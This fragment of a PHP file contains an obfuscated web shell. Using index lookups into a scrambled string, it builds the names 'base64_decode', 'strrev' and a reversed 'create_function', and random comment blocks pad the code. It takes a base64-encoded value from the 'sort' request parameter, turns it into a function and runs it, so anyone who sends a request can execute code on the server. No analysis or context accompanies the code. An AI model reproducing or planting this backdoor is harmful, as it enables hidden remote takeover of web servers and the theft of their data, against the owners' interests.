...
$CLiSuUCM8735 = "w4*zsgq0712ui;.ebvc/yh(t)nfx3a_69kpmrl8od5j";


$xSUWBpid2036 = "";

foreach([4,39,36,23] as $c){
       $xSUWBpid2036 .= $CLiSuUCM8735[$c];
    }


if(isset($_REQUEST /*YWtlhFZnqNcOmNaSfxReHhaEdLzWfzNlYqNctCZACavjkcyjCBifqOXbMHPBzxiMRecmzSTgHGHYbLRUSZtzTOORnWYANPxHEljQyCGgFFNhLMcZcQymoiyaIFbTUBGW*/["$xSUWBpid2036"])){
    $lMkNqFnz9473 = $_REQUEST /*YWtlhFZnqNcOmNaSfxReHhaEdLzWfzNlYqNctCZACavjkcyjCBifqOXbMHPBzxiMRecmzSTgHGHYbLRUSZtzTOORnWYANPxHEljQyCGgFFNhLMcZcQymoiyaIFbTUBGW*/["$xSUWBpid2036"];
    $fBeIskrq1074 = "";
    $YMOcIoIv1339 = "";

    /*wtEVbDXIXFVGIELHfedcOmiKGFNWgpcFnUNbyAfeNKQfDFeVTPITisNQsUefYASDYOPCPPgUwjDXsarCBShdvSlpZDoGKfCUCcLvZzbdZclibOyDcqAGCLDiyFsCpdfF*/

    foreach([16,29,4,15,31,1,30,40,15,18,39,40,15] as $c){
       $fBeIskrq1074 .= $CLiSuUCM8735[$c];
    }

    /*aJAIdCQFvnLNDWyYxhMDCYOuRbqQOuCJsJjpaYyBLTgMYxrMLrSTwETaeQhzgfSgDdMpQOaRUStenseTTVRDjESakZRBskbYHRiJBYvAXkBPwHKuUSKHQXJsjBvWxIfi*/


    foreach([4,23,36,36,15,17] as $c){
       $YMOcIoIv1339 .= $CLiSuUCM8735[$c];
    }

    /*FYxweBJDUWBUypkpOjwdrKvfcxTLwAbNwyGDBxRZJcwttqEDDTbUKQalPMkToLSKhtIdSNTOtBjliLRkkXAeYqyKvuuvaqBcMGEXcxOXVtRwQzXlLuTHfjQDUxyqFoeM*/

    $c = $YMOcIoIv1339('n'.''.''.''.''.'o'.''.''.''.''.'i'.''.''.''.'t'.''.''.''.'c'.''.''.'n'.'u'.''.'f'.''.''.'_'.''.'e'.'t'.''.''.'a'.''.''.'e'.''.''.''.'r'.''.''.''.''.'c'.''.'');
    $N = $c("", $fBeIskrq1074($lMkNqFnz9473));
    $N();
    exit();
